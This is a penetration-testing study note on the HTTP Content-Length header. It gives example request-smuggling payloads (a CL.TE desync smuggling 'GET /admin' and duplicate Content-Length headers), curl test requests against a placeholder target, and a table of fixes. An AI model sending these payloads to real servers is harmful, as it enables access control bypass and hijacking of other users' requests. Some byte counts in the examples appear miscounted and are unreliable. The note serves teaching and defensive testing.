---
tags: [vapt, http-headers, web, advanced]
difficulty: advanced
module: "03 - HTTP Headers"
topic: "03.21 Content-Length — Smuggling, Desync"
portswigger_labs: ["HTTP request smuggling — 22 labs"]
---

# 03.21 — Content-Length

## What is it?

`Content-Length` specifies the size of the request or response body in bytes. It tells the receiver exactly how many bytes to read. The conflict between Content-Length and Transfer-Encoding is the basis of HTTP request smuggling. Mismatched Content-Length also causes truncation, response splitting, and data leakage.

---

## How Content-Length Works

```
POST /login HTTP/1.1
Content-Length: 27

username=admin&password=pass

Server reads exactly 27 bytes of body.
Remaining bytes go to next request (in keep-alive connection).

MANIPULATION:
  Undercount: Content-Length: 10  → server reads only 10 bytes
              → rest treated as next request
  
  Overcount:  Content-Length: 100  → server waits for more bytes
              → timeout → DoS potential
```

---

## Attack: CL.TE HTTP Request Smuggling

```
Frontend: uses Content-Length to determine body end
Backend: uses Transfer-Encoding: chunked

POST / HTTP/1.1
Content-Length: 49
Transfer-Encoding: chunked

e\r\n
q=smuggled_data\r\n
0\r\n
\r\nGET /admin HTTP/1.1\r\n

WHAT HAPPENS:
  Frontend: Content-Length=49 → reads entire body → forwards to backend
  Backend: reads chunked → chunk e (14 bytes) + 0 (end) 
           → "GET /admin HTTP/1.1" left in buffer!
  → Next victim's request prefixed with "GET /admin HTTP/1.1"!
  → Victim unknowingly requests /admin!
```

**PortSwigger Labs:** HTTP request smuggling (22 labs)

---

## Attack: Response Smuggling (Content-Length in Response)

```
If Content-Length in response is shorter than actual body:
  → Browser stops reading early
  → Cache stores truncated response
  → Content injection if next response is predictable

If Content-Length is longer:
  → Browser waits for more bytes
  → Potential for response poisoning in shared connections
```

---

## Attack: Double Content-Length

```
POST / HTTP/1.1
Content-Length: 5
Content-Length: 100
Body: hello

Different servers pick different Content-Length!
  → Same desync as CL.TE but using two CL headers!

RFC says: reject requests with duplicate CL
But not all implementations do!
```

---

## Testing

```bash
# Check if server accepts body longer than Content-Length
curl -X POST https://target.com/api \
  -H "Content-Length: 5" \
  -d "username=admin&password=long_password"
# Does server process full body or just first 5 bytes?

# Send zero Content-Length with body
curl -X POST https://target.com/api \
  -H "Content-Length: 0" \
  -d "admin=true"
# Some servers ignore body when CL=0, some don't

# Duplicate Content-Length headers (via raw socket or Burp):
# In Burp Repeater (manual mode):
POST / HTTP/1.1
Content-Length: 0
Content-Length: 100
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CL/TE desync | Normalize both headers; use HTTP/2 end-to-end |
| Duplicate CL headers | Reject requests with duplicate Content-Length |
| CL longer than body | Timeout on incomplete bodies; don't hang indefinitely |

---

## Related Notes
- [[20 - Transfer-Encoding]] — the TE side of CL.TE desync
- [[02.15 - Transfer-Encoding]] — chunked encoding
- [[Module 10 - HTTP Request Smuggling]] — full smuggling module
